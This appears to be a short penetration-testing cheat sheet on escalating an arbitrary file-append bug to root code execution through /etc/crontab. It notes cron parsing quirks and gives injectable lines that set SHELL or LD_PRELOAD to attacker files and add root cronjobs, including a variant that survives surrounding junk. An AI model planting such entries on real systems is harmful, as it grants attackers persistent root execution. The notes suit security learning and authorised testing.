# Append To Arbitrary File
* as root or user you can append data to a file and ...
	* fully control content
	* partially control content (eg. parts of a logfile)
	* none (empty file)

### crontab
* requires `root` permissions
* file location `/etc/crontab`
* different cron variants exist https://pkgs.org/download/cron
* very strict syntax, no arbitrary text or bytes. Not even null-byte allowed
* comments start with `#`
* file has to end with a newline `\n`
* env variables assigned before cronjob line are set for the cronjob execution
	* use `SHELL` or `LD_PRELOAD` to execute a binary. File **must** be executable.

#### Clean File
* you can also set environment variable. But they have to be set before the cronjob
```
SHELL=/home/user/pwn
LD_PRELOAD=/home/user/lib.so
* * * * * root   (date;id) >> /tmp/crontab
@hourly root   (date;id) >> /tmp/crontab
```

#### Messy File
* see [`env.c` parsing](https://github.com/systemd-cron/crontab/blob/master/env.c#L132). if this fails to find an env var, it expects a crontab entry line.

```
fghr56%$^R4265ytd=invalid env var is ignored. But name must not contain space before = sign 8&$%(*& r5sa78d56rA&Ir67^RT%*x

SHELL=/home/user/pwn
LD_PRELOAD=/home/user/lib.so
* * * * * root   (date;id) >> /tmp/crontab

# this is a comment <00><ff> arbitrary bytes can be here
     # spaces are also fine
```